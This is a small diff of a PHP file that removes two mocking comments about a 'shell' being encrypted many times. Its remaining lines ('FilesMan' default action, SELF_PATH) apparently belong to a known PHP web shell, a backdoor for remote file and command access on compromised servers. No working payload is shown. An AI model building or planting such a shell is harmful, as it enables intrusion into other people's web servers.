@@ -1,7 +1,5 @@
 <?php
 
-//THE MOST STUPID SHELL ENCRYPTION EVER!
-//HE ENCRYPT HIS SHELL SO MANY TIMES HAHAHAHA
 
 $default_action = 'FilesMan';
 @define('SELF_PATH', __FILE__);
